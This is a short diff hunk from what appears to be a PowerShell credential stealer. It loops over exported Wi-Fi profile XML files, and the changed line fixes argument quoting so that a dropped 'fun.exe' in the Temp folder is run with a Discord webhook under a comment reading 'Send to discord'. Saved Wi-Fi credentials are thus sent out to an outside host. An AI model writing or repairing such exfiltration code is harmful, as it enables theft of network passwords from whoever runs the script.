@@ -36,7 +36,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 
 # Send to discord
 
-& "$env:LOCALAPPDATA\Temp\fun.exe -- $wh"
+& "$env:LOCALAPPDATA\Temp\fun.exe" --wh "$wh"
 
 # cleanup
 #cls
